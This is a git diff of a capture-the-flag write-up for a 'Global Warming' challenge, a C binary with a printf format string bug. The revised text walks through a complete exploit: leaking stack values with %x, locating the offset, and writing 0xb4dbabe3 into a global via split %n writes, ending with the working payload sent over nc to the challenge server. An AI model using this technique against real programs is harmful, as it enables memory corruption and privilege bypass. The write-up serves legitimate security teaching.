@@ -26,7 +26,7 @@ void login(char username[10], char *pass)
 {
 
 	printf(pass);
-	if (admin != 0)
+	if (admin != 0xb4dbabe3)
 	{
 		system("cat flag.txt");
 	}
@@ -55,20 +55,102 @@ Greta Thunberg 1 Administration 0
 
 ## Exploit
 
-The program has a global variable `admin`, the value of which needs to be changed. Looking at the program we see a printf statement, printing our input in `fgets`. Here, we need to use the string format exploit. We use `%x` as the format string input which returns values from the stack. We're also going to use the `%n` which writes the number of characters before the `%n` to the address just above(before) it in the stack. Also, memory addresses of global variables are stored in can be easily read from the `objdump` of the binary.
+The program has a global variable `admin`, the value of which needs to be changed. Looking at the program we see a printf statement, printing our input in `fgets`. Here, we need to use the format string exploit. We use `%x` as the format string input which returns values from the stack. We're also going to use the `%n` which writes the number of characters before the `%n` to the address just above(before) it in the stack. Also, memory addresses of global variables are stored in can be easily read from the `objdump` of the binary.
 <br />
 
-Steps to solve the challenge:
-1) Find out the memory address of `admin` using the command `objdump -t <binary of file>` this is where we need to write a non-zero value.
-2) Input a bunch of `%x`s to the program that will print values off of the stack.
-3) If you print enough number of `%x `s (It's a good idea to put a space after the `%x` to make printed values more readable), you get a recurring pattern (something like 25207825 78252078) and you realise you're seeing the `%x`s (something you can probably figure out by the `20`s which stand for blank spaces).\
-4) What you need to do is to ensure that the last byte you print is the memory address of `admin` as you want to modify the value stored there. You do this by using recognizable characters and some trial and error; changing the number of `%x `s
-5) When you reach this point you can replace the last `%x ` with `%n ` which should overwrite the value of `admin` with some number (the number of characters printed before it) and give you the flag.
-<br />
+Using `objdump -t` you can get the address of `admin`.
 
 ```bash
-$ python2 -c "print '\x2c\xc0\x04\x08' + '%x '*11 + '%n '" | ./global-warming
-,f7fe8a34 fbad2087 80491b2 f7f9de24 804c000 ffffd038 8049294 804a030 ffffcc30 f7f9e540 8049216  
+$ objdump -t ./global-warming | grep admin
+0804c02c g     O .bss   00000004              admin
+```
+
+Now, we need to write stuff to this location. Let's print some arbitrary value with a couple of `%x`s and see where it lands on the stack.
+
+```bash
+$ python2 -c "print 'AAAABBBBCCCC' + '%x ' * 30" | ./global-warming
+AAAABBBBCCCCf7fc7a34 fbad2087 80491b2 f7f7ce24 804c000 ffd7d7a8 8049297 804a030 ffd7d3a0 f7f7d540 8049219 41414141 42424242 43434343 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 
+You cannot login as admin.%  
+```
+
+You know that `AAAABBBBCCCC` is going to become `41414141 42424242 43434343` in the binary, since `A` in hex is 41. You find that in the 12th position. You can now make it print just the value in the 12th position on the stack using `%12$x`.
+
+```bash
+$ python2 -c "print 'AAAABBBBCCCC' + '%12\$x ' * 30" | ./global-warming
+AAAABBBBCCCC41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 
+You cannot login as admin.% 
+```
+
+That works! Now we need to replace `AAAA` with the address of `admin`. We can test this directly on GDB, set a breakpoint after the `printf` call. Then we'll use `%12$n` to write to the address of `admin`. (Read up about `%n`). First we set up a breakpoint and define a hook-stop.
+
+```bash
+Breakpoint 1 at 0x80491c3
+gdb-peda$ define hook-stop
+Type commands for definition of "hook-stop".
+End with a line saying just "end".
+>x/x 0x0804c02c
+>end
+```
+
+Now, we can run the program with the following input:
+
+```bash
+gdb-peda$ r < <(python2 -c "print '\x2c\xc0\x04\x08' + '%12\$x ' + '%12\$n'")Starting program: /home/roerohan/Documents/Repos/CSI/ctf-challenges/pwn/Global Warming/bin/global-warming < <(python2 -c "print '\x2c\xc0\x04\x08' + '%12\$x ' + '%12\$n'")
+,804c02c 
+0x804c02c <admin>:      0x0000000c
+```
+
+So, as you can see, this writes a really small value to the `admin` variable. Nice! Now we just need to add a huge padding, and  we can write the required value into that variable. Let's find out the padding you would need to include.
+
+```python
+>>> 0xb4dbabe3 - 0xc
+3034295255
+```
+
+This number is HUGE, will take ages to print these many characters. We can instead make it possible with two smaller writes. First write the last 2 bits, then shift the address by 2 bits and write to that location. Smart. So we can first store the address (after adding 2) on the stack as well, so that we can refer to it using the `%13$n` syntax.
+
+```bash
+gdb-peda$ r < <(python2 -c "print '\x2c\xc0\x04\x08' + '\x2e\xc0\x04\x08' + '%12\$x ' + '%12\$n'")
+Starting program: /home/roerohan/Documents/Repos/CSI/ctf-challenges/pwn/Global Warming/bin/global-warming < <(python2 -c "print '\x2c\xc0\x04\x08' + '\x2e\xc0\x04\x08' + '%12\$x ' + '%12\$n'")
+,.804c02c 
+0x804c02c <admin>:      0x00000010
+```
+
+Cool! Now we have both the values on the stack. We can reference `0x0804c02e` by doing `%13$x` and `0x0804c02e` by doing `%12$x`. Let's write to the first half of `admin` first. You can see that `0x00000010` is already written. Which means we need to write `0xabe3 - 10 + 1` characters to make it `0000abe3`. Let's test that!
+
+```bash
+gdb-peda$ r < <(python2 -c "print '\x2c\xc0\x04\x08' + '\x2e\xc0\x04\x08' + '%12\$43994x ' + '%12\$n'")
+Starting program: /home/roerohan/Documents/Repos/CSI/ctf-challenges/pwn/Global Warming/bin/global-warming < <(python2 -c "print '\x2c\xc0\x04\x08' + '\x2e\xc0\x04\x08' + '%12\$43994x ' + '%12\$n'")
+,. 
+...
+804c02c 
+0x804c02c <admin>:      0x0000abe3                                       
+```
+
+That worked! Now let's see what happens when we write to `%13\$n`.
+
+```bash
+gdb-peda$ r < <(python2 -c "print '\x2c\xc0\x04\x08' + '\x2e\xc0\x04\x08' + '%12\$43994x ' + '%12\$n' + '%13\$x' + '%13\$n'")
+
+804c02c 804c02e
+0x804c02c <admin>:      0xabeaabe3
+```
+
+So, it writes `abea` in the first half. We need it to be `b4db`. So we need to write atleast `b4db - 0xabea` characters.
+
+```bash
+gdb-peda$ r < <(python2 -c "print '\x2c\xc0\x04\x08' + '\x2e\xc0\x04\x08' + '%12\$43994x ' + '%12\$n' + '%13\$2289x' + '%13\$n'")
+...
+0x804c02c <admin>:      0xb4d4abe3
+```
+
+Close! Now just adjust the offset to make it `b4db`. You get the offset as `2295`characters. This is going to be our final payload.
+
+```bash
+$ (python2 -c "print '\x2c\xc0\x04\x08' +  '\x2e\xc0\x04\x08' + '%12\$43994x ' + '%12\$n ' + '%13\$2295x' + '%13\$n'"; cat) | nc chall.csivit.com 30023
+...
+...
+804c02e
 csictf{n0_5tr1ng5_@tt@ch3d}
 ```
 
